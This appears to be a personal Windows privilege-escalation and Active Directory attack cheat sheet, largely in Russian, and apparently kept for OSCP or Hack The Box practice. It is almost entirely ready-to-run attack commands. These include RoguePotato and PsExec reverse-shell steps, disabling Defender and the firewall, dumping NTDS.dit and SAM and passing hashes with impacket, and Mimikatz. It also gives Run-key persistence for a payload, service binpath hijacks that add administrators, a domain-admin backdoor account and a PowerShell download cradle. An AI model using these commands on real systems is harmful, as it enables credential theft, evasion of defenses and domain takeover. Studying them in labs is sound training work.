# Up_windows

# enumeration

systeminfo

netstat -ano | findstr ":<port>"

tasklist /svc



# Токен имперсонейшн

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

Start another listener on Kali.

Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999

# Посмотреть сохраненный креды

cmdkey /list

# Подсказки для виндовс

# https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec

https://sushant747.gitbooks.io/total-oscp-guide/content/basics_of_windows.html

# Список SPN внутри домена

setspn -T TA-D.Local -Q */*

klist

# Отключить Дефендер

sc stop windefend

sc query windefend

sc queryex type= service - все процессы

# Просмотр брандмауэра

netsh advfirewall firewall

netsh advfirewall show currentprofile

netsh advfirewall firewall show rule name=all

netsh firewall show state

netsh firewall show config

netsh advfirewall set allprofiles state off

# Создание теневой копии диска

vssadmin create shadow /for=c:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy


Поиск секретов


cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs


МИМИКАТЗ
мимикатз в метасплойт 

kiwi_cmd lsadump::sam


-----Распарсить SAM

python secretsdump.py -sam sam -system system LOCAL 

impacket-secretsdump hacker.local/user:password@ip_adress


-----Распарсить NTDS.DIT

impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text  

Распарсить на лету зная только хеш

impacket-secretsdump Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

----- Получить 10 последних пользователей

Нужен system и security

reg save hklm\system c:\system 

reg save hklm\security c:\security

Подробнее: https://www.securitylab.ru/analytics/517178.php

и пытаемся крякнуть мскеш2

john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash



Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)

Имперсонификация
PsExec64.exe -i -s cmd
PsExec64.exe -i -u "nt authority\local service" cmd

для psexec
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f





# Реестр виндовс 

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run - запрос значения ветки

reg query HKLM /f password /t REG_SZ /s - поиск слова password в реестре

reg qury HKLM\SYSTEM\CurrentControlSet\services\ - запрос списка сервисов

 sc config daclsvc binpath= "net localgroup administrators user /add" - использование возможности конфига сервиса
 
 sc qc daclsvc - запрос параметров сервиса

sc query daclsvc - состояние сервиса
 
Автозагрузка.....

"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

Если у вас права обычного пользователя, следует использовать ветку реестра HKCU

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
 
reg add "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"



Если у вас есть админские права в системе, следует использовать ветку HKLM — в таком случае каждый раз при запуске системы будет выполняться payload.exe или dll. Этот способ хорош тем, что не зависит от пользователя, который логинится в систему.

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v payload /t REG_SZ /d "C:\tmp\payload.dll"
 
reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”

********************************

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

 In the command prompt type: sc start regsvc

# Пример создания запланированной задачи:

schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /tr C:\tmp\Opera_autoupdate1594994248.exe

at 13:01 /interactive cmd запуск с правами администратора!!!

chcp 65001

psexec -i \\\adress -u user cmd

python smbexec.py ignite/administrator:Ignite@987@192.168.1.105

***************************************************************************************************************************************************
Cбор информации в домене 

net use * \\ta-d.local\NETLOGON - подключить сетевой диск

net accounts - парольная политика пользователя

net user /domain пользователи домена
Get-ADUser -identity administrator -properties *
Get-ADUser -identity administrator -properties memberof

net user administrator /domain в какие группы входит пользователь
net group "domain admins" кто входит в группы

Get-ADcomputer -filter * -properties * | ft nmae, ipv4adress компутеры в домене
net group "domain computer"
Systeminfo - отображает подробную информацию о конфигурации компьютера и его операционной системы.

wmic qfe  - перечислить патчи

wmic logicaldisk - перечислить диски


# Добавление пользователя в домен и в группу

net user mighty Password123! /add /domain
net group "domain admins" mighty /add /domain

# Enumeration running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}

C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc - проверка разрешений доступа к слжбам виндовс 

sc qc daclsvc - используется для получения информации о конфигурации и параметрах обслуживания приложения DAclSvc 

sc query daclsvc - информация о состянии службы (старт, стоп)

sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса

# Узнать у кого доступ в директорию

accesschk64.exe -wvu -accepteula "C:\Program Files\Autorun Program"

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc - доступ к сервису

icacls "C:\xampp\apache\bin\httpd.exe"
icalcs "C:\xampp\mysql\bin\mysqld.exe"



# Enumerate specific service
Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode

# Скрипты векторов повышения привелегий

cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs

findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs



!!! http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar

# Проверка мисконфигов виндовс

!!! https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS


  https://github.com/SecWiki/windows-kernel-exploits все эксплойты!!!

  # Сканер Эксплойтов виндовс

./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 

./wes.py systeminfo.txt -e --color --severity critical

# Hack Triks
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

# BloodHound/SharpHound
https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html (Установка шарпхаунда)

https://github.com/SkillfactoryCoding/HACKER-OS-BloodHound (оф репозиторий)

bloodhound-python --dns-tcp -ns 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d 'authority.htb' -c all (Дампим снаружи домена - нужны креды)

Запуск
cd /usr/bin
sudo ./neo4j console
./BloodHound --no-sandbox

# Проверка сертификатов
certipy-ad find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222

# Добавление компутера в домен
impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -computer-name 'Evil-PC' -computer-pass 'Password123'

# Power Shell

powershell -ep bypass (Обход блокировки скриптов)

Import-Module .\PowerView.ps1 (Загрузить модуль в память)

Set-ExecutionPolicy Unrestricted  - разрешить выполнение скриптов

Загрузка скриптов без получения разрешения на запуск POwerShell
IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  для которого import-module ./powerup.ps1 и затем Invoke-AllChecks или 
  Invoke-AllChecks | out-file -Encoding ASCII checks.txt

https://github.com/HarmJ0y/PowerUp

--Power view

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Get-NetUser | select cn    (список пользователей)

Get-NetGroup -GroupName *admin*   (список групп содержащих *админ*)

# Hot potato


Exploitation

Windows VM

1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators

